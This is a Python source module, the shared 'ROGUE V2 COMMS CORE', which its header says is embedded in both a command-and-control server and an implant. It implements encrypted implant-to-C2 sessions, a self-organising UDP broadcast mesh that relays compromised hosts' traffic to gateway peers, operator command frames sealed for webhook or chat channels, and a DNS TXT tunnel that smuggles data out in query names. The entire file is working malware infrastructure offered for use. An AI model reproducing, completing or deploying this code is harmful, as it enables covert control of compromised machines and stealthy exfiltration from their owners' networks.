#!/usr/bin/env python3
# ============================================================================
# ROGUE V2 COMMS CORE  (canonical single source of truth)
# ----------------------------------------------------------------------------
# This module is the crypto + mesh backbone for ROGUE v3.3.
# The exact same block of code is embedded in BOTH:
#     rogue_c2.py      (server / operator side)
#     rogue_implant.py (implant side)
# via scripts/sync_v2_core.py. Edit THIS file, then run the sync script.
#
# Security properties (read the README section "ROGUE V2 PROTOCOL"):
#   * X25519 ECDH key exchange (mode "e")  -> forward secrecy, per-session keys
#   * HKDF-SHA256 key derivation with context separation (directions, seq)
#   * AES-256-GCM AEAD on every message (auth + integrity, no plaintext ops)
#   * Fallback mode "p": per-message keys derived from the operator secret
#     (no ECDH possible when the `cryptography` lib is absent) - still AEAD.
#   * Monotonic per-direction sequence numbers -> anti-replay
#   * Server static public key is pinned in the implant config ->
#     MITM cannot impersonate the C2 even over unauthenticated TLS
#   * Pseudonymous routing labels: HMAC(operator_secret, identity) -> hex,
#     so identities never travel in clear on the mesh.
#   * P2P mesh frames are encrypted with a time-bucketed group key, so
#     passive observers see only ciphertext.
#
# This module contains NO secrets. Everything is injected via the caller.
# ============================================================================

import base64
import hashlib
import hmac
import json
import os
import socket
import struct
import threading
import time

# ---------------------------------------------------------------------------
# Backend detection
# ---------------------------------------------------------------------------
try:
    from cryptography.hazmat.primitives.asymmetric import x25519 as _rv2_x25519
    from cryptography.hazmat.primitives.serialization import (
        Encoding as _rv2_Enc,
        PublicFormat as _rv2_PubF,
        PrivateFormat as _rv2_PrivF,
        NoEncryption as _rv2_NoEnc,
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _rv2_AESGCM

    _RV2_HAS_ECDH = True
except Exception:  # pragma: no cover - backend detection
    _rv2_x25519 = None
    _rv2_AESGCM = None
    _RV2_HAS_ECDH = False

try:
    from Cryptodome.Cipher import AES as _rv2_PyAES
    _RV2_HAS_CRYPTODOME = True
except Exception:
    try:
        from Crypto.Cipher import AES as _rv2_PyAES
        _RV2_HAS_CRYPTODOME = True
    except Exception:
        _rv2_PyAES = None
        _RV2_HAS_CRYPTODOME = False

RV2_MAGIC = "R2V2"          # JSON wire frames start with this key
RV2_HELLO = "__hello__"
RV2_HELLO_ACK = "__hello_ack__"
RV2_MESH_ANN = "__mesh_ann__"
RV2_MESH_DATA = "__mesh_data__"
RV2_MESH_ROOT = "__C2_ROOT__"     # virtual label of the C2 on the mesh
RV2_TS_SKEW = 600                 # seconds of acceptable clock skew (log only)
RV2_SESSION_TTL = 3600            # server session lifetime before rekey needed
RV2_MESH_TTL = 5                  # max mesh relay hops
RV2_MESH_SEEN_TTL = 120           # mesh duplicate/loop cache (seconds)
RV2_MESH_DAY = 86400


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def rv2_b64e(b):
    return base64.b64encode(b).decode("ascii")


def rv2_b64d(s):
    if isinstance(s, str):
        s = s.encode("ascii")
    return base64.b64decode(s)


def rv2_rand(n=16):
    return os.urandom(n)


def rv2_secret_bytes(secret):
    """Accept str/bytes secret; str treated as hex if it decodes, else utf-8."""
    if isinstance(secret, bytes):
        return secret
    try:
        return bytes.fromhex(secret)
    except Exception:
        return secret.encode("utf-8")


def rv2_hkdf(ikm, salt, info, length=32):
    """HKDF-SHA256 (RFC 5869) - stdlib only."""
    if salt is None:
        salt = b"\x00" * 32
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    t = b""
    for i in range(1, 256):
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        if len(okm) >= length:
            break
    return okm[:length]


def rv2_hmac(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()


def rv2_label(secret, ident):
    """Pseudonymous routing label for an identity."""
    return rv2_hmac(rv2_secret_bytes(secret), b"rogue-v2-label|" + ident.encode("utf-8")).hex()[:20]


def rv2_root_label(secret):
    return rv2_label(secret, RV2_MESH_ROOT)


def rv2_default_mode():
    if _RV2_HAS_ECDH:
        return "e"
    if _RV2_HAS_CRYPTODOME:
        return "p"
    return None


def rv2_gen_static_key():
    """Generate (private_raw, public_raw) X25519 pair. Returns (None, None) if unsupported."""
    if not _RV2_HAS_ECDH:
        return None, None
    priv = _rv2_x25519.X25519PrivateKey.generate()
    pub = priv.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
    privb = priv.private_bytes(_rv2_Enc.Raw, _rv2_PrivF.Raw, _rv2_NoEnc())
    return privb, pub


# ---------------------------------------------------------------------------
# AEAD primitives (AES-256-GCM). Returns (ct, tag) / takes (ct, tag).
# ---------------------------------------------------------------------------
def rv2_aead_encrypt(key, nonce, plaintext, aad):
    if _RV2_HAS_ECDH:
        sealed = _rv2_AESGCM(key).encrypt(nonce, plaintext, aad)
        return sealed[:-16], sealed[-16:]
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    ct, tag = c.encrypt_and_digest(plaintext)
    return ct, tag


def rv2_aead_decrypt(key, nonce, ct, tag, aad):
    if _RV2_HAS_ECDH:
        return _rv2_AESGCM(key).decrypt(nonce, ct + tag, aad)
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    return c.decrypt_and_verify(ct, tag)


def rv2_derive_session(shared, salt, info_extra=b""):
    """Master session key from a DH shared secret + salt."""
    return rv2_hkdf(shared, salt, b"rogue-v2-kex|" + info_extra, 32)


def rv2_dir_keys(master):
    """Split master into per-direction AEAD keys (context separation)."""
    c2s = rv2_hkdf(master, b"", b"rogue-v2-dir-c2s", 32)
    s2c = rv2_hkdf(master, b"", b"rogue-v2-dir-s2c", 32)
    return c2s, s2c


def rv2_x25519_shared(priv_raw, pub_raw):
    """Raw X25519 shared secret. Raises if backend missing."""
    if not _RV2_HAS_ECDH:
        raise RuntimeError("ECDH backend unavailable")
    priv = _rv2_x25519.X25519PrivateKey.from_private_bytes(priv_raw)
    peer = _rv2_x25519.X25519PublicKey.from_public_bytes(pub_raw)
    return priv.exchange(peer)


# ---------------------------------------------------------------------------
# Wire envelope
# ---------------------------------------------------------------------------
def rv2_env(mode, ct, tag, nonce, salt, q, src, dst=None, k=None, h=None):
    env = {
        "v": 2,
        "m": mode,
        "n": rv2_b64e(nonce),
        "a": rv2_b64e(tag),
        "c": rv2_b64e(ct),
        "z": rv2_b64e(salt) if salt else "",
        "q": q,
        "s": src,
    }
    if dst:
        env["d"] = dst
    if k:
        env["k"] = rv2_b64e(k)
    if h is not None:
        env["h"] = h
    return json.dumps(env, separators=(",", ":")).encode("utf-8")


def rv2_parse_env(wire):
    if isinstance(wire, bytes):
        wire = wire.decode("utf-8", "replace")
    env = json.loads(wire)
    if env.get("v") != 2:
        raise ValueError("not a v2 frame")
    return env


def rv2_aad(mode, q, direction, dst=None):
    aad = b"rogue-v2|" + mode.encode("ascii") + b"|" + str(q).encode("ascii") + b"|" + direction.encode("ascii")
    if dst:
        aad += b"|" + dst.encode("ascii")
    return aad


# ---------------------------------------------------------------------------
# Client (implant side)
# ---------------------------------------------------------------------------
class RogueV2Client(object):
    """One E2E crypto context for an implant talking to the C2."""

    def __init__(self, secret, static_pub_b64=None, implant_id="unknown", mode=None, tls_verify=False):
        self.secret = rv2_secret_bytes(secret)
        self.static_pub = rv2_b64d(static_pub_b64) if static_pub_b64 else None
        self.id = implant_id or "unknown"
        self.label = rv2_label(self.secret, self.id)
        self.mode = mode or rv2_default_mode() or "p"
        if self.mode == "e" and not (_RV2_HAS_ECDH and self.static_pub):
            self.mode = "p"          # graceful downgrade, still AEAD-authenticated
        self.tls_verify = tls_verify
        # session state (mode e)
        self._keys = None            # (c2s, s2c) once hello is answered
        self._q_out = 0
        self._q_in_last = 0
        self._session_ts = 0
        self._hello_wire = None

    # -- helpers ------------------------------------------------------------
    def _seal(self, plaintext, q, direction, dst=None):
        mode = self.mode
        salt = rv2_rand(16)
        if mode == "e":
            if not self._keys:
                raise RuntimeError("session not established (no hello_ack)")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
            master = None
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
            master = None
        nonce = rv2_rand(12)
        ct, tag = rv2_aead_encrypt(key, nonce, plaintext, rv2_aad(mode, q, direction, dst))
        return rv2_env(mode, ct, tag, nonce, salt, q, self.label, dst=dst)

    def _open(self, wire, direction):
        env = rv2_parse_env(wire)
        if env["m"] != self.mode:
            # downgrade tolerance: accept p frames only if we are in p
            raise ValueError("mode mismatch")
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if q <= self._q_in_last:
            raise ValueError("replay (q=%d <= %d)" % (q, self._q_in_last))
        if env["m"] == "e":
            if not self._keys:
                raise ValueError("no session keys yet")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(env["m"], q, direction, env.get("d")))
        self._q_in_last = q
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def build_hello(self):
        """Return the hello wire frame for a fresh session (mode e) or a
        stateless identity frame (mode p)."""
        self._q_out = 0
        self._q_in_last = 0
        inner = {"o": RV2_HELLO, "id": self.id, "ts": int(time.time() * 1000), "m": self.mode}
        if self.mode == "e":
            eph = _rv2_x25519.X25519PrivateKey.generate()
            eph_pub = eph.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
            salt = rv2_rand(16)
            # bind the operator secret into the hello: the ECDH AEAD alone only
            # proves possession of the (public) static key, so anyone could
            # impersonate an implant. This HMAC proves knowledge of the secret.
            inner["a"] = rv2_hmac(self.secret, eph_pub + salt + b"|" + self.id.encode("utf-8")).hex()
            shared = eph.exchange(_rv2_x25519.X25519PublicKey.from_public_bytes(self.static_pub))
            master = rv2_derive_session(shared, salt, b"|" + eph_pub + self.static_pub)
            c2s, s2c = rv2_dir_keys(master)
            self._keys = (c2s, s2c)
            self._session_ts = time.time()
            nonce = rv2_rand(12)
            # AAD binds q + direction; k/z carried in envelope for the server
            aad = rv2_aad(self.mode, 0, "c2s")
            ct, tag = rv2_aead_encrypt(c2s, nonce, json.dumps(inner).encode("utf-8"), aad)
            self._q_out = 1  # next frame after hello uses q=1
            env = rv2_env(self.mode, ct, tag, nonce, salt, 0, self.label, k=eph_pub)
            return env
        else:
            # mode p: per-message key derivation proves knowledge of secret
            self._q_out = 1
            return self._seal(json.dumps(inner).encode("utf-8"), 0, "c2s")

    def handle_hello_ack(self, wire):
        """Process the server hello_ack, completing session establishment."""
        inner = self._open(wire, "s2c")
        if inner.get("o") != RV2_HELLO_ACK:
            raise ValueError("expected hello_ack")
        return inner

    def seal_op(self, opdict, dst=None):
        """Seal an operation dict to the C2. opdict: {"o": <op string>, ...}"""
        if self._q_out == 0:
            raise RuntimeError("call build_hello() first")
        q = self._q_out
        self._q_out += 1
        return self._seal(json.dumps(opdict).encode("utf-8"), q, "c2s", dst=dst)

    def open_op(self, wire):
        """Open a frame from the C2. Returns the inner op dict."""
        return self._open(wire, "s2c")

    def is_ready(self):
        if self.mode == "e":
            return self._keys is not None and (time.time() - self._session_ts) < RV2_SESSION_TTL
        return True

    def rekey_needed(self):
        if self.mode == "e":
            return (time.time() - self._session_ts) >= RV2_SESSION_TTL
        return False


# ---------------------------------------------------------------------------
# Server (C2 side)
# ---------------------------------------------------------------------------
class RogueV2Server(object):
    """Accepts hellos from implants, keeps per-label sessions, seals replies."""

    def __init__(self, secret, static_priv_raw=None):
        self.secret = rv2_secret_bytes(secret)
        self.priv = static_priv_raw
        self.sessions = {}      # label -> dict(mode, id, bot_id, keys, q_in, q_out, ts, ip)
        self._lock = threading.Lock()

    # -- internal -----------------------------------------------------------
    def _session_key(self, label, direction):
        s = self.sessions.get(label)
        if not s:
            raise ValueError("unknown session %s" % label)
        c2s, s2c = s["keys"]
        return c2s if direction == "c2s" else s2c

    def _open_data(self, env, direction, ip=""):
        label = env["s"]
        mode = env["m"]
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if mode == "e":
            key = self._session_key(label, direction)
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(mode, q, direction, env.get("d")))
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def recv(self, wire, ip=""):
        """Handle one frame. Returns (inner_opdict, label, is_new_session)."""
        env = rv2_parse_env(wire)
        label = env["s"]
        mode = env["m"]
        q = env["q"]
        nonce = rv2_b64d(env["n"])
        ct = rv2_b64d(env["c"])
        tag = rv2_b64d(env["a"])
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        with self._lock:
            sess = self.sessions.get(label)

            if q == 0:
                # ---- hello frame (fresh session / rekey) ----
                if mode == "e":
                    if not _RV2_HAS_ECDH or not self.priv:
                        raise ValueError("ECDH hello but server has no static key")
                    k = rv2_b64d(env["k"])
                    shared = rv2_x25519_shared(self.priv, k)
                    master = rv2_derive_session(shared, salt, b"|" + k + self.static_pub())
                    keys = rv2_dir_keys(master)
                    key = keys[0]  # c2s
                else:
                    keys = None
                    key = rv2_hkdf(self.secret, salt,
                                   b"rogue-v2-psk|c2s|0", 32)
                try:
                    plain = rv2_aead_decrypt(key, nonce, ct, tag, rv2_aad(mode, 0, "c2s"))
                except Exception:
                    raise ValueError("hello authentication failed")
                inner = json.loads(plain.decode("utf-8"))
                if inner.get("o") != RV2_HELLO:
                    raise ValueError("expected hello frame")
                if mode == "e":
                    # verify operator-secret proof (see client build_hello)
                    k_raw = rv2_b64d(env["k"])
                    expected = rv2_hmac(self.secret, k_raw + salt + b"|" + str(inner.get("id", "")).encode("utf-8")).hex()
                    if not hmac.compare_digest(expected, str(inner.get("a", ""))):
                        raise ValueError("hello authentication failed")
                if sess is None:
                    sess = {"mode": mode, "id": inner.get("id", "unknown"),
                            "bot_id": None, "keys": keys, "q_in": 0,
                            "q_out": 0, "ts": time.time(), "ip": ip}
                    self.sessions[label] = sess
                else:
                    sess["mode"] = mode
                    sess["id"] = inner.get("id", sess.get("id", "unknown"))
                    sess["keys"] = keys
                    sess["ts"] = time.time()
                    sess["ip"] = ip
                sess["q_in"] = 0
                return inner, label, True

            # ---- data frame ----
            if sess is None:
                if mode != "p":
                    raise ValueError("unknown session %s" % label)
                # p-mode is stateless (per-message keys from the shared secret)
                sess = {"mode": "p", "id": "label_" + label, "bot_id": None,
                        "keys": None, "q_in": 0, "q_out": 0,
                        "ts": time.time(), "ip": ip}
                self.sessions[label] = sess
            if q <= sess["q_in"]:
                raise ValueError("replay (q=%d <= %d)" % (q, sess["q_in"]))
            inner = self._open_data(env, "c2s", ip=ip)
            sess["q_in"] = q
            sess["ts"] = time.time()
            sess["ip"] = ip
            return inner, label, False

    def reply(self, label, opdict):
        """Seal a reply to an implant session."""
        with self._lock:
            sess = self.sessions.get(label)
            if not sess:
                raise ValueError("unknown session %s" % label)
            q = sess["q_out"] + 1
            sess["q_out"] = q
            mode = sess["mode"]
            salt = rv2_rand(16)
            if mode == "e":
                key = self._session_key(label, "s2c")
            else:
                key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|s2c|" + str(q).encode("ascii"), 32)
            nonce = rv2_rand(12)
            ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(opdict).encode("utf-8"),
                                       rv2_aad(mode, q, "s2c", label))
            return rv2_env(mode, ct, tag, nonce, salt, q, rv2_root_label(self.secret), dst=label)

    def static_pub(self):
        if not _RV2_HAS_ECDH:
            return b""
        pub = _rv2_x25519.X25519PrivateKey.from_private_bytes(self.priv).public_key()
        return pub.public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)

    def expire(self):
        now = time.time()
        with self._lock:
            dead = [k for k, s in self.sessions.items() if now - s["ts"] > RV2_SESSION_TTL * 2]
            for k in dead:
                del self.sessions[k]


# ---------------------------------------------------------------------------
# Encrypted P2P mesh (UDP broadcast domain)
# ---------------------------------------------------------------------------
class RogueMesh(object):
    """Always-on encrypted peer mesh.

    * Every frame is AEAD-encrypted under a time-bucketed group key derived
      from the operator secret (rotates daily).
    * Peers authenticate by proving knowledge of the group key.
    * `announce` frames gossip (label, gateway-capability) so every peer can
      route to every other peer by label.
    * `data` frames carry raw E2E C2 frames; non-gateway peers forward them
      toward a gateway (`d` == mesh root label). Gateways deliver them to the
      C2 via their direct channel (on_root callback). Replies walk back by
      dst-label routing.
    """

    def __init__(self, secret, my_label, ports=(7008, 7009, 7010, 7011),
                 announce_interval=45, on_root=None, on_me=None, log=None):
        self.secret = rv2_secret_bytes(secret)
        self.my_label = my_label
        self.ports = ports
        self.announce_interval = announce_interval
        self.on_root = on_root          # cb(raw_wire) -> raw_wire or None
        self.on_me = on_me              # cb(raw_wire) -> None (C2 reply for me)
        self.log = log or (lambda *a: None)
        self.peers = {}                 # label -> {addr, gw, ts, last_ann}
        self._q = 0
        self._lock = threading.Lock()
        self._seen = {}                 # (s,q) -> ts  loop cache
        self._gw = False                # am I currently C2-reachable?
        self._sock = None
        self._running = False

    # -- group key (rotates daily) -----------------------------------------
    def _mesh_key(self, bucket_ts):
        salt = struct.pack(">q", int(bucket_ts // RV2_MESH_DAY))
        return rv2_hkdf(self.secret, salt, b"rogue-v2-mesh", 32)

    # -- packet build/parse ------------------------------------------------
    def _seal_mesh(self, inner, q, dst=None, ttl=None):
        mode = "p"  # mesh always uses per-message keys
        salt = rv2_rand(16)
        key = rv2_hkdf(self._mesh_key(time.time()), salt,
                       b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
        nonce = rv2_rand(12)
        aad = b"rogue-mesh|" + str(q).encode("ascii") + b"|" + self.my_label.encode("ascii")
        if dst:
            aad += b"|" + dst.encode("ascii")
        ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), aad)
        return rv2_env(mode, ct, tag, nonce, salt, q, self.my_label, dst=dst, h=ttl)

    def _open_mesh(self, packet):
        env = rv2_parse_env(packet)
        q = env["q"]
        salt = rv2_b64d(env["z"])
        key = None
        # try current and previous day bucket (clock/rotation tolerance)
        for bucket in (time.time(), time.time() - RV2_MESH_DAY):
            kk = rv2_hkdf(self._mesh_key(bucket), salt,
                          b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
            try:
                plain = rv2_aead_decrypt(kk, rv2_b64d(env["n"]), rv2_b64d(env["c"]),
                                         rv2_b64d(env["a"]),
                                         b"rogue-mesh|" + str(q).encode("ascii") + b"|" + env["s"].encode("ascii") + (b"|" + env["d"].encode("ascii") if env.get("d") else b""))
                key = kk
                break
            except Exception:
                continue
        if key is None:
            raise ValueError("mesh auth failed")
        return json.loads(plain.decode("utf-8")), env["s"], env["q"], env.get("d"), env.get("h")

    # -- peer table ---------------------------------------------------------
    def set_gateway(self, gw):
        self._gw = bool(gw)

    def is_gateway(self):
        return self._gw

    def peer_addrs(self, label):
        with self._lock:
            p = self.peers.get(label)
            if p and time.time() - p["ts"] < 600:
                return p["addr"]
        return None

    def _learn(self, label, addr, gw, ann=False):
        now = time.time()
        with self._lock:
            p = self.peers.get(label)
            if p:
                p["addr"] = addr
                p["gw"] = gw or p["gw"]
                p["ts"] = now
                if ann:
                    p["last_ann"] = now
            else:
                self.peers[label] = {"addr": addr, "gw": gw, "ts": now, "last_ann": now if ann else 0}
            # prune stale
            dead = [k for k, v in self.peers.items() if now - v["ts"] > 600]
            for k in dead:
                del self.peers[k]

    def _pick_route(self, dst_label, exclude=None):
        """Pick a peer to forward toward dst_label (gw peers preferred for root)."""
        now = time.time()
        with self._lock:
            cands = [(l, p) for l, p in self.peers.items()
                     if l != self.my_label and l != exclude and now - p["ts"] < 300]
        if dst_label == rv2_root_label(self.secret):
            gws = [c for c in cands if c[1]["gw"]]
            if gws:
                cands = gws
        if not cands:
            return None
        cands.sort(key=lambda c: (0 if c[1]["gw"] else 1, -c[1]["ts"]))
        return cands[0]

    # -- sending ------------------------------------------------------------
    def send_data(self, raw_wire, dst_label):
        """Send an E2E raw frame toward dst_label (usually the mesh root)."""
        self._q += 1
        q = self._q
        inner = {"o": RV2_MESH_DATA, "b": rv2_b64e(raw_wire)}
        if dst_label == rv2_root_label(self.secret):
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
            packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
            return self._udp_send(packet, addr)
        addr = self.peer_addrs(dst_label)
        if addr is None:
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
        packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
        return self._udp_send(packet, addr)

    def send_announce(self):
        self._q += 1
        inner = {"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}
        packet = self._seal_mesh(inner, self._q)
        for port in self.ports:
            try:
                self._sock.sendto(packet, ("<broadcast>", port))
            except Exception:
                pass
            try:
                self._sock.sendto(packet, ("255.255.255.255", port))
            except Exception:
                pass

    def _udp_send(self, packet, addr):
        try:
            self._sock.sendto(packet, (addr[0], addr[1]))
            return True
        except Exception as e:
            self.log("[mesh] send failed: %s" % e)
            return False

    # -- receive loop -------------------------------------------------------
    def _handle(self, packet, addr):
        try:
            inner, src_label, q, dst_label, ttl = self._open_mesh(packet)
        except Exception:
            return  # unauthenticated / undecryptable -> drop
        now = time.time()
        seen_key = (src_label, q)
        if seen_key in self._seen and now - self._seen[seen_key] < RV2_MESH_SEEN_TTL:
            return
        self._seen[seen_key] = now
        typ = inner.get("o")
        gw_flag = bool(inner.get("g"))

        if typ == RV2_MESH_ANN:
            is_new = src_label not in self.peers
            self._learn(src_label, (addr[0], addr[1]), gw_flag, ann=True)
            # reply with our own announce ONLY to brand-new peers (bootstrap),
            # otherwise every announce would trigger an infinite reply ping-pong
            if is_new:
                self._q += 1
                self._udp_send(self._seal_mesh({"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}, self._q), (addr[0], addr[1]))
            return

        if typ == RV2_MESH_DATA:
            raw = rv2_b64d(inner["b"])
            if dst_label == rv2_root_label(self.secret):
                # I am the gateway hop: deliver to C2 via direct channel
                if self.on_root:
                    resp = self.on_root(raw)
                    if resp:
                        self._q += 1
                        back = self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(resp)},
                                               self._q, dst=src_label, ttl=RV2_MESH_TTL)
                        a = self.peer_addrs(src_label)
                        if a:
                            self._udp_send(back, a)
                        else:
                            hop = self._pick_route(src_label, exclude=src_label)
                            if hop:
                                self._udp_send(back, hop[1]["addr"])
                return
            if dst_label == self.my_label:
                # a C2 reply made it back to me
                if self.on_me:
                    self.on_me(raw)
                return
            # forward toward destination
            ttl = ttl if ttl is not None else RV2_MESH_TTL
            if ttl <= 1:
                return
            hop = self._pick_route(dst_label, exclude=src_label)
            if not hop:
                return
            self._q += 1
            self._udp_send(self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(raw)},
                                           self._q, dst=dst_label, ttl=ttl - 1), hop[1]["addr"])

    def start(self):
        if self._running:
            return
        self._running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # NOTE: no SO_REUSEADDR - it would let two implants on one host bind the
        # same UDP port, making unicast delivery ambiguous. First-free-port wins.
        bound = False
        for port in self.ports:
            try:
                sock.bind(("0.0.0.0", port))
                bound = True
                break
            except OSError:
                continue
        if not bound:
            self.log("[mesh] failed to bind any port")
            self._running = False
            return False
        self._sock = sock
        threading.Thread(target=self._rx_loop, daemon=True).start()
        threading.Thread(target=self._ann_loop, daemon=True).start()
        return True

    def _rx_loop(self):
        while self._running:
            try:
                packet, addr = self._sock.recvfrom(65535)
            except OSError:
                break
            try:
                self._handle(packet, addr)
            except Exception:
                continue

    def _ann_loop(self):
        # announce immediately on start, then on the interval
        self.send_announce()
        while self._running:
            time.sleep(self.announce_interval)
            self.send_announce()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# OOB (out-of-band) channel helpers - operator <-> implant command frames.
# These are PSK-sealed with the operator secret so ONLY fleet members can
# read/write them, with a coarse timestamp window + seen-set for replay
# protection (operator is the only writer, so per-message keys + ts window
# are sufficient here).
# ---------------------------------------------------------------------------
def rv2_oob_seal(secret, opdict, ts=None):
    """Seal an operator->implant OOB command frame (PSK mode)."""
    secret = rv2_secret_bytes(secret)
    inner = dict(opdict)
    inner["ts"] = int(ts if ts is not None else time.time() * 1000)
    salt = rv2_rand(16)
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|1", 32)
    nonce = rv2_rand(12)
    q = 1
    ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), rv2_aad("p", q, "oob"))
    env = rv2_env("p", ct, tag, nonce, salt, q, rv2_label(secret, "__OPERATOR__"))
    return base64.b64encode(env).decode("ascii")  # channel-friendly (webhook/chat)


def rv2_oob_open(secret, b64frame, seen=None, window_ms=300000):
    """Open an OOB frame. `seen` is a set of ts values already handled.
    Raises ValueError on auth failure / replay / stale frame."""
    secret = rv2_secret_bytes(secret)
    env = rv2_parse_env(rv2_b64d(b64frame))
    if env.get("m") != "p":
        raise ValueError("oob frame must be psk mode")
    salt = rv2_b64d(env["z"])
    q = env["q"]
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|" + str(q).encode("ascii"), 32)
    plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]),
                             rv2_aad("p", q, "oob"))
    inner = json.loads(plain.decode("utf-8"))
    now = time.time() * 1000
    if abs(now - inner.get("ts", 0)) > window_ms:
        raise ValueError("oob frame stale")
    if seen is not None and inner["ts"] in seen:
        raise ValueError("oob frame replay")
    return inner


# ---------------------------------------------------------------------------
# DNS-over-stdlib client helper (used by the DNS transport channel)
# ---------------------------------------------------------------------------
def rv2_dns_query_txt(qname, resolver_ip, timeout=6.0, tries=2, resolver_port=53):
    """Minimal DNS TXT query over UDP using only the stdlib.

    Returns the concatenation of all TXT strings, or None on failure.
    """
    import random as _random

    def _build_query(domain, qid):
        out = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 1)  # arcount=1 (EDNS0 OPT)
        for label in domain.split("."):
            lb = label.encode("ascii")
            if len(lb) > 63:
                return None
            out += bytes([len(lb)]) + lb
        out += b"\x00"
        out += struct.pack(">HH", 16, 1)  # TXT, IN
        # EDNS0 OPT RR: root name, type 41, class = 4096 (UDP payload), ttl 0
        out += b"\x00" + struct.pack(">HHIH", 41, 4096, 0, 0)
        return out

    def _parse_txt(resp):
        if len(resp) < 12:
            return None
        (qid, flags, qd, an, ns, ar) = struct.unpack(">HHHHHH", resp[:12])
        if flags & 0x000F != 0:
            return None
        off = 12
        # skip question
        while off < len(resp) and resp[off] != 0:
            if resp[off] & 0xC0 == 0xC0:
                off += 2
                break
            off += 1 + resp[off]
        off += 1 + 4
        # answers
        txts = []
        for _ in range(an):
            if off >= len(resp):
                break
            if resp[off] & 0xC0 == 0xC0:
                off += 2
            else:
                while off < len(resp) and resp[off] != 0:
                    off += 1 + resp[off]
                off += 1
            off += 10  # type, class, ttl, rdlen
            rdlen = struct.unpack(">H", resp[off - 2:off])[0]
            end = off + rdlen
            while off < end:
                ln = resp[off]
                off += 1
                txts.append(resp[off:off + ln].decode("utf-8", "replace"))
                off += ln
        return "".join(txts)

    for attempt in range(tries):
        qid = _random.randint(0, 65535)
        pkt = _build_query(qname, qid)
        if pkt is None:
            return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(pkt, (resolver_ip, resolver_port))
            data = s.recvfrom(65535)[0]
            s.close()
            parsed_qid = struct.unpack(">H", data[:2])[0]
            if parsed_qid != qid:
                continue
            res = _parse_txt(data)
            if res is not None:
                return res
        except Exception:
            continue
    return None


def rv2_dns_tunnel_send(raw_wire, zone, resolver_ip, seq=0, resolver_port=53):
    """Send a raw v2 frame over DNS as a sequence of TXT queries.

    The frame is base64url-encoded and split across multiple queries
    (each <= 50 chars per label so total qname stays well under the RFC 1035
    255-octet limit). Format per query:
        <rnd>.<chunk_index>.<chunk_total>.<b64chunk>.<zone>
    Intermediate queries are answered with "ack"; the final query carries the
    response (base64url, possibly multi-string TXT). Returns the decoded
    response bytes, or None on failure.
    """
    b64 = base64.urlsafe_b64encode(raw_wire).decode("ascii").rstrip("=")
    if len(b64) <= 50:
        chunks = [b64]
    else:
        chunks = [b64[i:i + 50] for i in range(0, len(b64), 50)]
    rnd = rv2_rand(4).hex()
    total = len(chunks)
    last_resp = None
    for i, chunk in enumerate(chunks):
        qname = "%s.%d.%d.%s.%s" % (rnd, i, total, chunk, zone)
        if len(qname) > 250:
            return None
        resp = rv2_dns_query_txt(qname, resolver_ip, resolver_port=resolver_port)
        if resp is None:
            return None  # ack/answer lost -> caller retries whole frame next cycle
        resp = resp.strip()
        if resp == "ack" or resp == "":
            continue
        last_resp = resp
    if not last_resp:
        return None
    try:
        b = last_resp.replace("-", "+").replace("_", "/")
        b += "=" * ((4 - len(b) % 4) % 4)
        return base64.b64decode(b)
    except Exception:
        return None


